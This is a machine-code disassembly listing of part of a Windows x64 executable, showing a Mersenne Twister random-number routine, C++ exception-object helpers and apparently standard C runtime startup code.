   14000668d:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   140006693:	41 33 88 2c 06 00 00 	xor    0x62c(%r8),%ecx
   14000669a:	33 ca                	xor    %edx,%ecx
   14000669c:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   1400066a3:	49 83 ea 01          	sub    $0x1,%r10
   1400066a7:	75 c7                	jne    0x140006670
   1400066a9:	4d 8d 81 54 0d 00 00 	lea    0xd54(%r9),%r8
   1400066b0:	41 ba 8c 01 00 00    	mov    $0x18c,%r10d
   1400066b6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   1400066bd:	00 00 00 
   1400066c0:	41 8b 50 fc          	mov    -0x4(%r8),%edx
   1400066c4:	41 33 10             	xor    (%r8),%edx
   1400066c7:	4d 8d 40 04          	lea    0x4(%r8),%r8
   1400066cb:	0f ba f2 1f          	btr    $0x1f,%edx
   1400066cf:	41 33 50 f8          	xor    -0x8(%r8),%edx
   1400066d3:	8b c2                	mov    %edx,%eax
   1400066d5:	24 01                	and    $0x1,%al
   1400066d7:	f6 d8                	neg    %al
   1400066d9:	1b c9                	sbb    %ecx,%ecx
   1400066db:	d1 ea                	shr    $1,%edx
   1400066dd:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   1400066e3:	41 33 88 ac f2 ff ff 	xor    -0xd54(%r8),%ecx
   1400066ea:	33 ca                	xor    %edx,%ecx
   1400066ec:	41 89 88 38 f6 ff ff 	mov    %ecx,-0x9c8(%r8)
   1400066f3:	49 83 ea 01          	sub    $0x1,%r10
   1400066f7:	75 c7                	jne    0x1400066c0
   1400066f9:	41 8b 81 80 13 00 00 	mov    0x1380(%r9),%eax
   140006700:	8b d0                	mov    %eax,%edx
   140006702:	41 33 51 04          	xor    0x4(%r9),%edx
   140006706:	0f ba f2 1f          	btr    $0x1f,%edx
   14000670a:	33 d0                	xor    %eax,%edx
   14000670c:	8b c2                	mov    %edx,%eax
   14000670e:	24 01                	and    $0x1,%al
   140006710:	f6 d8                	neg    %al
   140006712:	1b c9                	sbb    %ecx,%ecx
   140006714:	d1 ea                	shr    $1,%edx
   140006716:	81 e1 df b0 08 99    	and    $0x9908b0df,%ecx
   14000671c:	33 ca                	xor    %edx,%ecx
   14000671e:	41 33 89 34 06 00 00 	xor    0x634(%r9),%ecx
   140006725:	33 d2                	xor    %edx,%edx
   140006727:	41 89 89 c0 09 00 00 	mov    %ecx,0x9c0(%r9)
   14000672e:	41 89 11             	mov    %edx,(%r9)
   140006731:	8b c2                	mov    %edx,%eax
   140006733:	41 8b 4c 81 04       	mov    0x4(%r9,%rax,4),%ecx
   140006738:	8d 42 01             	lea    0x1(%rdx),%eax
   14000673b:	41 89 01             	mov    %eax,(%r9)
   14000673e:	8b c1                	mov    %ecx,%eax
   140006740:	c1 e8 0b             	shr    $0xb,%eax
   140006743:	41 23 81 84 13 00 00 	and    0x1384(%r9),%eax
   14000674a:	33 c1                	xor    %ecx,%eax
   14000674c:	8b d0                	mov    %eax,%edx
   14000674e:	81 e2 ad 58 3a ff    	and    $0xff3a58ad,%edx
   140006754:	c1 e2 07             	shl    $0x7,%edx
   140006757:	33 d0                	xor    %eax,%edx
   140006759:	8b ca                	mov    %edx,%ecx
   14000675b:	81 e1 8c df ff ff    	and    $0xffffdf8c,%ecx
   140006761:	c1 e1 0f             	shl    $0xf,%ecx
   140006764:	33 ca                	xor    %edx,%ecx
   140006766:	8b c1                	mov    %ecx,%eax
   140006768:	c1 e8 12             	shr    $0x12,%eax
   14000676b:	33 c1                	xor    %ecx,%eax
   14000676d:	c3                   	ret
   14000676e:	cc                   	int3
   14000676f:	cc                   	int3
   140006770:	48 63 41 fc          	movslq -0x4(%rcx),%rax
   140006774:	48 2b c8             	sub    %rax,%rcx
   140006777:	e9 a4 f1 ff ff       	jmp    0x140005920
   14000677c:	ff 25 5e 1a 00 00    	jmp    *0x1a5e(%rip)        # 0x1400081e0
   140006782:	cc                   	int3
   140006783:	cc                   	int3
   140006784:	40 53                	rex push %rbx
   140006786:	48 83 ec 20          	sub    $0x20,%rsp
   14000678a:	48 8b d9             	mov    %rcx,%rbx
   14000678d:	b9 10 00 00 00       	mov    $0x10,%ecx
   140006792:	ff 15 d8 1c 00 00    	call   *0x1cd8(%rip)        # 0x140008470
   140006798:	48 8b d0             	mov    %rax,%rdx
   14000679b:	48 85 c0             	test   %rax,%rax
   14000679e:	74 1b                	je     0x1400067bb
   1400067a0:	48 8b 05 d9 6b 00 00 	mov    0x6bd9(%rip),%rax        # 0x14000d380
   1400067a7:	48 89 02             	mov    %rax,(%rdx)
   1400067aa:	48 89 5a 08          	mov    %rbx,0x8(%rdx)
   1400067ae:	48 89 15 cb 6b 00 00 	mov    %rdx,0x6bcb(%rip)        # 0x14000d380
   1400067b5:	48 83 c4 20          	add    $0x20,%rsp
   1400067b9:	5b                   	pop    %rbx
   1400067ba:	c3                   	ret
   1400067bb:	e8 11 00 00 00       	call   0x1400067d1
   1400067c0:	cc                   	int3
   1400067c1:	cc                   	int3
   1400067c2:	cc                   	int3
   1400067c3:	cc                   	int3
   1400067c4:	48 ff 25 3d 19 00 00 	rex.W jmp *0x193d(%rip)        # 0x140008108
   1400067cb:	ff 25 d7 19 00 00    	jmp    *0x19d7(%rip)        # 0x1400081a8
   1400067d1:	ff 25 a1 19 00 00    	jmp    *0x19a1(%rip)        # 0x140008178
   1400067d7:	cc                   	int3
   1400067d8:	cc                   	int3
   1400067d9:	cc                   	int3
   1400067da:	cc                   	int3
   1400067db:	cc                   	int3
   1400067dc:	cc                   	int3
   1400067dd:	cc                   	int3
   1400067de:	cc                   	int3
   1400067df:	cc                   	int3
   1400067e0:	48 8b 05 19 68 00 00 	mov    0x6819(%rip),%rax        # 0x14000d000
   1400067e7:	33 d2                	xor    %edx,%edx
   1400067e9:	48 ff 25 60 1e 00 00 	rex.W jmp *0x1e60(%rip)        # 0x140008650
   1400067f0:	40 53                	rex push %rbx
   1400067f2:	48 83 ec 20          	sub    $0x20,%rsp
   1400067f6:	48 8b d9             	mov    %rcx,%rbx
   1400067f9:	48 8d 05 e0 1e 00 00 	lea    0x1ee0(%rip),%rax        # 0x1400086e0
   140006800:	48 89 01             	mov    %rax,(%rcx)
   140006803:	8b 42 08             	mov    0x8(%rdx),%eax
   140006806:	89 41 08             	mov    %eax,0x8(%rcx)
   140006809:	48 8b 4a 10          	mov    0x10(%rdx),%rcx
   14000680d:	48 89 4b 10          	mov    %rcx,0x10(%rbx)
   140006811:	48 c7 43 18 00 00 00 	movq   $0x0,0x18(%rbx)
   140006818:	00 
   140006819:	48 85 c9             	test   %rcx,%rcx
   14000681c:	74 0d                	je     0x14000682b
   14000681e:	48 8b 01             	mov    (%rcx),%rax
   140006821:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006825:	ff 15 25 1e 00 00    	call   *0x1e25(%rip)        # 0x140008650
   14000682b:	48 8b c3             	mov    %rbx,%rax
   14000682e:	48 83 c4 20          	add    $0x20,%rsp
   140006832:	5b                   	pop    %rbx
   140006833:	c3                   	ret
   140006834:	cc                   	int3
   140006835:	cc                   	int3
   140006836:	cc                   	int3
   140006837:	cc                   	int3
   140006838:	cc                   	int3
   140006839:	cc                   	int3
   14000683a:	cc                   	int3
   14000683b:	cc                   	int3
   14000683c:	cc                   	int3
   14000683d:	cc                   	int3
   14000683e:	cc                   	int3
   14000683f:	cc                   	int3
   140006840:	40 53                	rex push %rbx
   140006842:	48 83 ec 20          	sub    $0x20,%rsp
   140006846:	48 8b d9             	mov    %rcx,%rbx
   140006849:	48 8d 05 90 1e 00 00 	lea    0x1e90(%rip),%rax        # 0x1400086e0
   140006850:	48 89 01             	mov    %rax,(%rcx)
   140006853:	89 51 08             	mov    %edx,0x8(%rcx)
   140006856:	4c 89 41 10          	mov    %r8,0x10(%rcx)
   14000685a:	48 c7 41 18 00 00 00 	movq   $0x0,0x18(%rcx)
   140006861:	00 
   140006862:	4d 85 c0             	test   %r8,%r8
   140006865:	74 15                	je     0x14000687c
   140006867:	45 84 c9             	test   %r9b,%r9b
   14000686a:	74 10                	je     0x14000687c
   14000686c:	49 8b 00             	mov    (%r8),%rax
   14000686f:	49 8b c8             	mov    %r8,%rcx
   140006872:	48 8b 40 08          	mov    0x8(%rax),%rax
   140006876:	ff 15 d4 1d 00 00    	call   *0x1dd4(%rip)        # 0x140008650
   14000687c:	48 8b c3             	mov    %rbx,%rax
   14000687f:	48 83 c4 20          	add    $0x20,%rsp
   140006883:	5b                   	pop    %rbx
   140006884:	c3                   	ret
   140006885:	cc                   	int3
   140006886:	cc                   	int3
   140006887:	cc                   	int3
   140006888:	cc                   	int3
   140006889:	cc                   	int3
   14000688a:	cc                   	int3
   14000688b:	cc                   	int3
   14000688c:	cc                   	int3
   14000688d:	cc                   	int3
   14000688e:	cc                   	int3
   14000688f:	cc                   	int3
   140006890:	40 53                	rex push %rbx
   140006892:	48 83 ec 20          	sub    $0x20,%rsp
   140006896:	48 8b d9             	mov    %rcx,%rbx
   140006899:	48 8d 05 40 1e 00 00 	lea    0x1e40(%rip),%rax        # 0x1400086e0
   1400068a0:	48 89 01             	mov    %rax,(%rcx)
   1400068a3:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1400068a7:	48 85 c9             	test   %rcx,%rcx
   1400068aa:	74 0d                	je     0x1400068b9
   1400068ac:	48 8b 01             	mov    (%rcx),%rax
   1400068af:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400068b3:	ff 15 97 1d 00 00    	call   *0x1d97(%rip)        # 0x140008650
   1400068b9:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   1400068bd:	48 85 c9             	test   %rcx,%rcx
   1400068c0:	74 0c                	je     0x1400068ce
   1400068c2:	48 83 c4 20          	add    $0x20,%rsp
   1400068c6:	5b                   	pop    %rbx
   1400068c7:	48 ff 25 1a 18 00 00 	rex.W jmp *0x181a(%rip)        # 0x1400080e8
   1400068ce:	48 83 c4 20          	add    $0x20,%rsp
   1400068d2:	5b                   	pop    %rbx
   1400068d3:	c3                   	ret
   1400068d4:	cc                   	int3
   1400068d5:	cc                   	int3
   1400068d6:	cc                   	int3
   1400068d7:	cc                   	int3
   1400068d8:	cc                   	int3
   1400068d9:	cc                   	int3
   1400068da:	cc                   	int3
   1400068db:	cc                   	int3
   1400068dc:	cc                   	int3
   1400068dd:	cc                   	int3
   1400068de:	cc                   	int3
   1400068df:	cc                   	int3
   1400068e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400068e5:	57                   	push   %rdi
   1400068e6:	48 83 ec 20          	sub    $0x20,%rsp
   1400068ea:	8b fa                	mov    %edx,%edi
   1400068ec:	48 8b d9             	mov    %rcx,%rbx
   1400068ef:	48 8d 05 ea 1d 00 00 	lea    0x1dea(%rip),%rax        # 0x1400086e0
   1400068f6:	48 89 01             	mov    %rax,(%rcx)
   1400068f9:	48 8b 49 10          	mov    0x10(%rcx),%rcx
   1400068fd:	48 85 c9             	test   %rcx,%rcx
   140006900:	74 0d                	je     0x14000690f
   140006902:	48 8b 01             	mov    (%rcx),%rax
   140006905:	48 8b 40 10          	mov    0x10(%rax),%rax
   140006909:	ff 15 41 1d 00 00    	call   *0x1d41(%rip)        # 0x140008650
   14000690f:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140006913:	48 85 c9             	test   %rcx,%rcx
   140006916:	74 07                	je     0x14000691f
   140006918:	ff 15 ca 17 00 00    	call   *0x17ca(%rip)        # 0x1400080e8
   14000691e:	90                   	nop
   14000691f:	40 f6 c7 01          	test   $0x1,%dil
   140006923:	74 0d                	je     0x140006932
   140006925:	ba 20 00 00 00       	mov    $0x20,%edx
   14000692a:	48 8b cb             	mov    %rbx,%rcx
   14000692d:	e8 6e 00 00 00       	call   0x1400069a0
   140006932:	48 8b c3             	mov    %rbx,%rax
   140006935:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000693a:	48 83 c4 20          	add    $0x20,%rsp
   14000693e:	5f                   	pop    %rdi
   14000693f:	c3                   	ret
   140006940:	48 83 ec 48          	sub    $0x48,%rsp
   140006944:	4c 8b c2             	mov    %rdx,%r8
   140006947:	45 33 c9             	xor    %r9d,%r9d
   14000694a:	8b d1                	mov    %ecx,%edx
   14000694c:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006951:	e8 ea fe ff ff       	call   0x140006840
   140006956:	48 8d 15 93 3f 00 00 	lea    0x3f93(%rip),%rdx        # 0x14000a8f0
   14000695d:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140006962:	e8 75 0f 00 00       	call   0x1400078dc
   140006967:	cc                   	int3
   140006968:	cc                   	int3
   140006969:	cc                   	int3
   14000696a:	cc                   	int3
   14000696b:	cc                   	int3
   14000696c:	cc                   	int3
   14000696d:	cc                   	int3
   14000696e:	cc                   	int3
   14000696f:	cc                   	int3
   140006970:	cc                   	int3
   140006971:	cc                   	int3
   140006972:	cc                   	int3
   140006973:	cc                   	int3
   140006974:	cc                   	int3
   140006975:	cc                   	int3
   140006976:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000697d:	00 00 00 
   140006980:	48 3b 0d b9 66 00 00 	cmp    0x66b9(%rip),%rcx        # 0x14000d040
   140006987:	75 10                	jne    0x140006999
   140006989:	48 c1 c1 10          	rol    $0x10,%rcx
   14000698d:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140006992:	75 01                	jne    0x140006995
   140006994:	c3                   	ret
   140006995:	48 c1 c9 10          	ror    $0x10,%rcx
   140006999:	e9 86 06 00 00       	jmp    0x140007024
   14000699e:	cc                   	int3
   14000699f:	cc                   	int3
   1400069a0:	e9 c7 07 00 00       	jmp    0x14000716c
   1400069a5:	cc                   	int3
   1400069a6:	cc                   	int3
   1400069a7:	cc                   	int3
   1400069a8:	40 53                	rex push %rbx
   1400069aa:	48 83 ec 20          	sub    $0x20,%rsp
   1400069ae:	48 8b d9             	mov    %rcx,%rbx
   1400069b1:	eb 0f                	jmp    0x1400069c2
   1400069b3:	48 8b cb             	mov    %rbx,%rcx
   1400069b6:	e8 51 0f 00 00       	call   0x14000790c
   1400069bb:	85 c0                	test   %eax,%eax
   1400069bd:	74 13                	je     0x1400069d2
   1400069bf:	48 8b cb             	mov    %rbx,%rcx
   1400069c2:	e8 3f 0f 00 00       	call   0x140007906
   1400069c7:	48 85 c0             	test   %rax,%rax
   1400069ca:	74 e7                	je     0x1400069b3
   1400069cc:	48 83 c4 20          	add    $0x20,%rsp
   1400069d0:	5b                   	pop    %rbx
   1400069d1:	c3                   	ret
   1400069d2:	48 83 fb ff          	cmp    $0xffffffffffffffff,%rbx
   1400069d6:	74 06                	je     0x1400069de
   1400069d8:	e8 bb 07 00 00       	call   0x140007198
   1400069dd:	cc                   	int3
   1400069de:	e8 ad a8 ff ff       	call   0x140001290
   1400069e3:	cc                   	int3
   1400069e4:	48 8b c4             	mov    %rsp,%rax
   1400069e7:	4c 89 48 20          	mov    %r9,0x20(%rax)
   1400069eb:	4c 89 40 18          	mov    %r8,0x18(%rax)
   1400069ef:	48 89 50 10          	mov    %rdx,0x10(%rax)
   1400069f3:	53                   	push   %rbx
   1400069f4:	56                   	push   %rsi
   1400069f5:	57                   	push   %rdi
   1400069f6:	41 56                	push   %r14
   1400069f8:	48 83 ec 38          	sub    $0x38,%rsp
   1400069fc:	4d 8b f1             	mov    %r9,%r14
   1400069ff:	49 8b d8             	mov    %r8,%rbx
   140006a02:	48 8b f2             	mov    %rdx,%rsi
   140006a05:	c6 40 c8 00          	movb   $0x0,-0x38(%rax)
   140006a09:	48 8b fa             	mov    %rdx,%rdi
   140006a0c:	49 0f af f8          	imul   %r8,%rdi
   140006a10:	48 03 f9             	add    %rcx,%rdi
   140006a13:	48 89 78 08          	mov    %rdi,0x8(%rax)
   140006a17:	48 8b c3             	mov    %rbx,%rax
   140006a1a:	48 ff cb             	dec    %rbx
   140006a1d:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   140006a22:	48 85 c0             	test   %rax,%rax
   140006a25:	74 19                	je     0x140006a40
   140006a27:	48 2b fe             	sub    %rsi,%rdi
   140006a2a:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140006a2f:	48 8b cf             	mov    %rdi,%rcx
   140006a32:	49 8b c6             	mov    %r14,%rax
   140006a35:	48 8b 15 14 1c 00 00 	mov    0x1c14(%rip),%rdx        # 0x140008650
   140006a3c:	ff d2                	call   *%rdx
   140006a3e:	eb d7                	jmp    0x140006a17
   140006a40:	c6 44 24 20 01       	movb   $0x1,0x20(%rsp)
   140006a45:	48 83 c4 38          	add    $0x38,%rsp
   140006a49:	41 5e                	pop    %r14
   140006a4b:	5f                   	pop    %rdi
   140006a4c:	5e                   	pop    %rsi
   140006a4d:	5b                   	pop    %rbx
   140006a4e:	c3                   	ret
   140006a4f:	cc                   	int3
   140006a50:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140006a55:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140006a5a:	57                   	push   %rdi
   140006a5b:	41 56                	push   %r14
   140006a5d:	41 57                	push   %r15
   140006a5f:	48 83 ec 40          	sub    $0x40,%rsp
   140006a63:	4d 8b f1             	mov    %r9,%r14
   140006a66:	49 8b f0             	mov    %r8,%rsi
   140006a69:	4c 8b fa             	mov    %rdx,%r15
   140006a6c:	48 8b f9             	mov    %rcx,%rdi
   140006a6f:	33 db                	xor    %ebx,%ebx
   140006a71:	48 89 5c 24 38       	mov    %rbx,0x38(%rsp)
   140006a76:	48 3b de             	cmp    %rsi,%rbx
   140006a79:	74 19                	je     0x140006a94
   140006a7b:	49 2b ff             	sub    %r15,%rdi
   140006a7e:	48 89 7c 24 60       	mov    %rdi,0x60(%rsp)
   140006a83:	48 8b cf             	mov    %rdi,%rcx
   140006a86:	49 8b c6             	mov    %r14,%rax
   140006a89:	ff 15 c1 1b 00 00    	call   *0x1bc1(%rip)        # 0x140008650
   140006a8f:	48 ff c3             	inc    %rbx
   140006a92:	eb dd                	jmp    0x140006a71
   140006a94:	eb 00                	jmp    0x140006a96
   140006a96:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140006a9b:	48 8b 74 24 70       	mov    0x70(%rsp),%rsi
   140006aa0:	48 83 c4 40          	add    $0x40,%rsp
   140006aa4:	41 5f                	pop    %r15
   140006aa6:	41 5e                	pop    %r14
   140006aa8:	5f                   	pop    %rdi
   140006aa9:	c3                   	ret
   140006aaa:	cc                   	int3
   140006aab:	cc                   	int3
   140006aac:	40 53                	rex push %rbx
   140006aae:	48 83 ec 20          	sub    $0x20,%rsp
   140006ab2:	48 8d 05 67 1c 00 00 	lea    0x1c67(%rip),%rax        # 0x140008720
   140006ab9:	48 8b d9             	mov    %rcx,%rbx
   140006abc:	48 89 01             	mov    %rax,(%rcx)
   140006abf:	f6 c2 01             	test   $0x1,%dl
   140006ac2:	74 0a                	je     0x140006ace
   140006ac4:	ba 18 00 00 00       	mov    $0x18,%edx
   140006ac9:	e8 d2 fe ff ff       	call   0x1400069a0
   140006ace:	48 8b c3             	mov    %rbx,%rax
   140006ad1:	48 83 c4 20          	add    $0x20,%rsp
   140006ad5:	5b                   	pop    %rbx
   140006ad6:	c3                   	ret
   140006ad7:	cc                   	int3
   140006ad8:	40 53                	rex push %rbx
   140006ada:	48 83 ec 20          	sub    $0x20,%rsp
   140006ade:	b9 02 00 00 00       	mov    $0x2,%ecx
   140006ae3:	e8 30 0e 00 00       	call   0x140007918
   140006ae8:	e8 87 07 00 00       	call   0x140007274
   140006aed:	8b c8                	mov    %eax,%ecx
   140006aef:	e8 5a 0e 00 00       	call   0x14000794e
   140006af4:	e8 6f 07 00 00       	call   0x140007268
   140006af9:	8b d8                	mov    %eax,%ebx
   140006afb:	e8 72 0e 00 00       	call   0x140007972
   140006b00:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006b05:	89 18                	mov    %ebx,(%rax)
   140006b07:	e8 b0 02 00 00       	call   0x140006dbc
   140006b0c:	84 c0                	test   %al,%al
   140006b0e:	74 73                	je     0x140006b83
   140006b10:	e8 1f 0a 00 00       	call   0x140007534
   140006b15:	48 8d 0d 54 0a 00 00 	lea    0xa54(%rip),%rcx        # 0x140007570
   140006b1c:	e8 4b 04 00 00       	call   0x140006f6c
   140006b21:	e8 46 07 00 00       	call   0x14000726c
   140006b26:	8b c8                	mov    %eax,%ecx
   140006b28:	e8 f7 0d 00 00       	call   0x140007924
   140006b2d:	85 c0                	test   %eax,%eax
   140006b2f:	75 52                	jne    0x140006b83
   140006b31:	e8 46 07 00 00       	call   0x14000727c
   140006b36:	e8 79 07 00 00       	call   0x1400072b4
   140006b3b:	85 c0                	test   %eax,%eax
   140006b3d:	74 0c                	je     0x140006b4b
   140006b3f:	48 8d 0d 22 07 00 00 	lea    0x722(%rip),%rcx        # 0x140007268
   140006b46:	e8 d3 0d 00 00       	call   0x14000791e
   140006b4b:	e8 34 04 00 00       	call   0x140006f84
   140006b50:	e8 2f 04 00 00       	call   0x140006f84
   140006b55:	e8 0e 07 00 00       	call   0x140007268
   140006b5a:	8b c8                	mov    %eax,%ecx
   140006b5c:	e8 05 0e 00 00       	call   0x140007966
   140006b61:	e8 26 07 00 00       	call   0x14000728c
   140006b66:	84 c0                	test   %al,%al
   140006b68:	74 05                	je     0x140006b6f
   140006b6a:	e8 bb 0d 00 00       	call   0x14000792a
   140006b6f:	e8 f4 06 00 00       	call   0x140007268
   140006b74:	e8 eb 08 00 00       	call   0x140007464
   140006b79:	85 c0                	test   %eax,%eax
   140006b7b:	75 06                	jne    0x140006b83
   140006b7d:	48 83 c4 20          	add    $0x20,%rsp
   140006b81:	5b                   	pop    %rbx
   140006b82:	c3                   	ret
   140006b83:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006b88:	e8 4f 07 00 00       	call   0x1400072dc
   140006b8d:	cc                   	int3
   140006b8e:	cc                   	int3
   140006b8f:	cc                   	int3
   140006b90:	48 83 ec 28          	sub    $0x28,%rsp
   140006b94:	e8 ff 06 00 00       	call   0x140007298
   140006b99:	33 c0                	xor    %eax,%eax
   140006b9b:	48 83 c4 28          	add    $0x28,%rsp
   140006b9f:	c3                   	ret
   140006ba0:	48 83 ec 28          	sub    $0x28,%rsp
   140006ba4:	e8 17 09 00 00       	call   0x1400074c0
   140006ba9:	e8 ba 06 00 00       	call   0x140007268
   140006bae:	8b c8                	mov    %eax,%ecx
   140006bb0:	48 83 c4 28          	add    $0x28,%rsp
   140006bb4:	e9 b3 0d 00 00       	jmp    0x14000796c
   140006bb9:	cc                   	int3
   140006bba:	cc                   	int3
   140006bbb:	cc                   	int3
   140006bbc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140006bc1:	57                   	push   %rdi
   140006bc2:	48 83 ec 30          	sub    $0x30,%rsp
   140006bc6:	b9 01 00 00 00       	mov    $0x1,%ecx
   140006bcb:	e8 b0 01 00 00       	call   0x140006d80
   140006bd0:	84 c0                	test   %al,%al
   140006bd2:	0f 84 30 01 00 00    	je     0x140006d08
   140006bd8:	40 32 ff             	xor    %dil,%dil
   140006bdb:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140006be0:	e8 5f 01 00 00       	call   0x140006d44
   140006be5:	8a d8                	mov    %al,%bl
   140006be7:	8b 0d a3 67 00 00    	mov    0x67a3(%rip),%ecx        # 0x14000d390
   140006bed:	83 f9 01             	cmp    $0x1,%ecx
   140006bf0:	0f 84 1d 01 00 00    	je     0x140006d13
   140006bf6:	85 c9                	test   %ecx,%ecx
   140006bf8:	75 4a                	jne    0x140006c44
   140006bfa:	c7 05 8c 67 00 00 01 	movl   $0x1,0x678c(%rip)        # 0x14000d390
   140006c01:	00 00 00 
   140006c04:	48 8d 15 a5 1a 00 00 	lea    0x1aa5(%rip),%rdx        # 0x1400086b0
   140006c0b:	48 8d 0d 86 1a 00 00 	lea    0x1a86(%rip),%rcx        # 0x140008698
   140006c12:	e8 25 0d 00 00       	call   0x14000793c
   140006c17:	85 c0                	test   %eax,%eax
   140006c19:	74 0a                	je     0x140006c25
   140006c1b:	b8 ff 00 00 00       	mov    $0xff,%eax
   140006c20:	e9 d8 00 00 00       	jmp    0x140006cfd
   140006c25:	48 8d 15 64 1a 00 00 	lea    0x1a64(%rip),%rdx        # 0x140008690
   140006c2c:	48 8d 0d 45 1a 00 00 	lea    0x1a45(%rip),%rcx        # 0x140008678
   140006c33:	e8 fe 0c 00 00       	call   0x140007936
   140006c38:	c7 05 4e 67 00 00 02 	movl   $0x2,0x674e(%rip)        # 0x14000d390
   140006c3f:	00 00 00 
   140006c42:	eb 08                	jmp    0x140006c4c
   140006c44:	40 b7 01             	mov    $0x1,%dil
   140006c47:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140006c4c:	8a cb                	mov    %bl,%cl
   140006c4e:	e8 8d 02 00 00       	call   0x140006ee0
   140006c53:	e8 68 06 00 00       	call   0x1400072c0
   140006c58:	48 8b d8             	mov    %rax,%rbx
   140006c5b:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006c5f:	74 1e                	je     0x140006c7f
   140006c61:	48 8b c8             	mov    %rax,%rcx
   140006c64:	e8 df 01 00 00       	call   0x140006e48
   140006c69:	84 c0                	test   %al,%al
   140006c6b:	74 12                	je     0x140006c7f
   140006c6d:	45 33 c0             	xor    %r8d,%r8d
   140006c70:	41 8d 50 02          	lea    0x2(%r8),%edx
   140006c74:	33 c9                	xor    %ecx,%ecx
   140006c76:	48 8b 03             	mov    (%rbx),%rax
   140006c79:	ff 15 d1 19 00 00    	call   *0x19d1(%rip)        # 0x140008650
   140006c7f:	e8 44 06 00 00       	call   0x1400072c8
   140006c84:	48 8b d8             	mov    %rax,%rbx
   140006c87:	48 83 38 00          	cmpq   $0x0,(%rax)
   140006c8b:	74 14                	je     0x140006ca1
   140006c8d:	48 8b c8             	mov    %rax,%rcx
   140006c90:	e8 b3 01 00 00       	call   0x140006e48
   140006c95:	84 c0                	test   %al,%al
   140006c97:	74 08                	je     0x140006ca1
   140006c99:	48 8b 0b             	mov    (%rbx),%rcx
   140006c9c:	e8 bf 0c 00 00       	call   0x140007960
   140006ca1:	e8 82 07 00 00       	call   0x140007428
   140006ca6:	0f b7 d8             	movzwl %ax,%ebx
   140006ca9:	e8 82 0c 00 00       	call   0x140007930
   140006cae:	44 8b cb             	mov    %ebx,%r9d
   140006cb1:	4c 8b c0             	mov    %rax,%r8
   140006cb4:	33 d2                	xor    %edx,%edx
   140006cb6:	48 8d 0d 43 93 ff ff 	lea    -0x6cbd(%rip),%rcx        # 0x140000000
   140006cbd:	e8 de cf ff ff       	call   0x140003ca0
   140006cc2:	8b d8                	mov    %eax,%ebx
   140006cc4:	e8 a3 07 00 00       	call   0x14000746c
   140006cc9:	84 c0                	test   %al,%al
   140006ccb:	74 50                	je     0x140006d1d
   140006ccd:	40 84 ff             	test   %dil,%dil
   140006cd0:	75 05                	jne    0x140006cd7
   140006cd2:	e8 7d 0c 00 00       	call   0x140007954
   140006cd7:	33 d2                	xor    %edx,%edx
   140006cd9:	b1 01                	mov    $0x1,%cl
   140006cdb:	e8 24 02 00 00       	call   0x140006f04
   140006ce0:	8b c3                	mov    %ebx,%eax
   140006ce2:	eb 19                	jmp    0x140006cfd
   140006ce4:	8b d8                	mov    %eax,%ebx
   140006ce6:	e8 81 07 00 00       	call   0x14000746c
   140006ceb:	84 c0                	test   %al,%al
   140006ced:	74 36                	je     0x140006d25
   140006cef:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140006cf4:	75 05                	jne    0x140006cfb
   140006cf6:	e8 5f 0c 00 00       	call   0x14000795a
   140006cfb:	8b c3                	mov    %ebx,%eax
   140006cfd:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140006d02:	48 83 c4 30          	add    $0x30,%rsp
   140006d06:	5f                   	pop    %rdi
   140006d07:	c3                   	ret
   140006d08:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006d0d:	e8 ca 05 00 00       	call   0x1400072dc
   140006d12:	90                   	nop
   140006d13:	b9 07 00 00 00       	mov    $0x7,%ecx
   140006d18:	e8 bf 05 00 00       	call   0x1400072dc
   140006d1d:	8b cb                	mov    %ebx,%ecx
   140006d1f:	e8 1e 0c 00 00       	call   0x140007942
   140006d24:	90                   	nop
   140006d25:	8b cb                	mov    %ebx,%ecx
   140006d27:	e8 1c 0c 00 00       	call   0x140007948
   140006d2c:	90                   	nop
   140006d2d:	cc                   	int3
   140006d2e:	cc                   	int3
   140006d2f:	cc                   	int3
   140006d30:	48 83 ec 28          	sub    $0x28,%rsp
   140006d34:	e8 7f 04 00 00       	call   0x1400071b8
   140006d39:	48 83 c4 28          	add    $0x28,%rsp
   140006d3d:	e9 7a fe ff ff       	jmp    0x140006bbc
   140006d42:	cc                   	int3
   140006d43:	cc                   	int3
   140006d44:	48 83 ec 28          	sub    $0x28,%rsp
   140006d48:	e8 f7 0a 00 00       	call   0x140007844
   140006d4d:	85 c0                	test   %eax,%eax
   140006d4f:	74 21                	je     0x140006d72
   140006d51:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140006d58:	00 00 
   140006d5a:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140006d5e:	eb 05                	jmp    0x140006d65
   140006d60:	48 3b c8             	cmp    %rax,%rcx
   140006d63:	74 14                	je     0x140006d79
   140006d65:	33 c0                	xor    %eax,%eax
   140006d67:	f0 48 0f b1 0d 28 66 	lock cmpxchg %rcx,0x6628(%rip)        # 0x14000d398
   140006d6e:	00 00 
   140006d70:	75 ee                	jne    0x140006d60
